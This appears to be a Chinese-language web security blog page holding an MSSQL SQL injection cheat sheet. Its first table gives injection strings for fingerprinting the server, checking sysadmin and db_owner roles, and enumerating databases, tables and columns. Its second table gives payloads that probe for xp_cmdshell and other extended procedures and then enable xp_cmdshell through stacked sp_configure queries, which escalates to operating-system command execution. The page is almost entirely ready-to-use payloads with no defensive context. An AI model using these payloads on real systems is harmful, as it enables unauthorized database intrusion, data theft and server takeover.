---
layout: default
category: Web安全
tags: [SQL注入]
---

## 1、信息收集

| 测试目的                                                 | 测试语句                                                     |
| -------------------------------------------------------- | ------------------------------------------------------------ |
| 判断是否是SQLserver                                      | and exists (select * from sysobjects)                        |
| 判断是不是sysadmin、public角色成员                       | and 1=(select IS_SRVROLEMEMBER('sysadmin'))                  |
| 判断是否是db_owner角色成员                               | and 1=(select is_member('db_owner'))                         |
| 判断是不是可以读取其它库如master(**public角色成员即可**) | and 1=(select has_dbaccess('master'))                        |
| 判断mssql版本                                            | and 1=(select @@version)                                     |
| 判断本地服务器名                                         | and 1=(select @@servername)                                  |
| 判断是否支持多行                                         | ;declare @d int                                              |
| 判断是否支持注释符--                                     | -- dsf                                                       |
| 判断是否支持注释符/**/                                   | /`*`hjkbhjg`*`/                                              |
| 判断是否支持子语句查询                                   | and (select count(1) from [sysobjects])>=0                   |
| 判断数据库名1                                            | and (select db_name())>0                                     |
| 判断数据库名2                                            | and (select top 1 name from master.dbo.sysdatabases where name not in (select top N name from master.dbo.sysdatabases order by dbid))>1)) |
| 判断表名                                                 | and (select top 1 name from sysobjects  where xtype='u' and  name not in  (select top N name from sysobjects where xtype='u'))>1 |
| 判断列名                                                 | and 1=0 union select * from (表名) having 1=1                |

## 2、存储提权

| 测试目的                                                     | 测试语句                                                     |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| 检测xp_cmdshell                                              | and 1=(select count(*) from master.dbo.sysobjects where name='xp_cmdshell') |
| 检测XP_REGREAD                                               | and 1=(select count(*) from master.dbo.sysobjects where name='xp_regread') |
| 检测SP_MAKEWEBTASK（备份功能，**2005中取消了**）             | and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_makewebtask') |
| 检测SP_ADDEXTENDEDPROC（可拓展存储过程）                     | and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'sp_addextendedproc') |
| 检测XP_SUBDIRS（读子目录）                                   | and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_subdirs') |
| 检测XP_DIRTREE（读子目录）                                   | and 1=(SELECT count(*) FROM master.dbo.sysobjects WHERE name= 'xp_dirtree') |
| 开启show advanced options（显示或修改高级选项）              | ;EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE; |
| 开启XP_CMDSHELL（2005和2008默认关闭）（高级选项）            | ;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE WITH OVERRIDE; |
